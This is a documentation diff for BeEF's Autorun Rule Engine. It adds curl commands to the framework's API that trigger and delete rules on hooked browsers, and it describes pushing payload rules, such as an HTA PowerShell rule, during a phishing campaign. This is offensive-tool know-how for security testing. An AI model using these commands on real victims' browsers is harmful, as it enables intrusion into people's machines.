@@ -231,13 +231,21 @@ You can add it to BeEF with the following cURL request:
 ```javascript
 curl -H "Content-Type: application/json; charset=UTF-8" --data "@ie_win_htapowershell.json" -X POST http://172.16.45.1:3000/api/autorun/rule/add?token=xyz
 ```
-### Trigger rule
-```javascript
 
+If the action was successful, you will get the rule_id back, in order to use with other API calls.
+### Trigger rule
+By default rules are triggered only once when the browser is successfully hooked. However there might be cases where you need to add then trigger immediately a ruleset. For instance, you have 5 rules pre-loaded during your phishing campaign, but none of them cover Android, and at the same time you notice lots of Android targets newly hooked. Well the ARE is flexible enough to let you add (at runtime) new rules, then trigger them when you want on already-hooked browsers.
+
+Following the same example used previously, given that the rule added has id 1, you can trigger it on every online hooked browser with the following:
+
+```javascript
+curl http://172.16.45.1:3000/api/autorun/rule/trigger/1?token=xyz
 ```
 ### Delete rule
-```javascript
+This is quite self-explanatory ;-)
 
+```javascript
+curl http://172.16.45.1:3000/api/autorun/rule/delete/1?token=xyz
 ```
 ### List rule(s)
 ```javascript
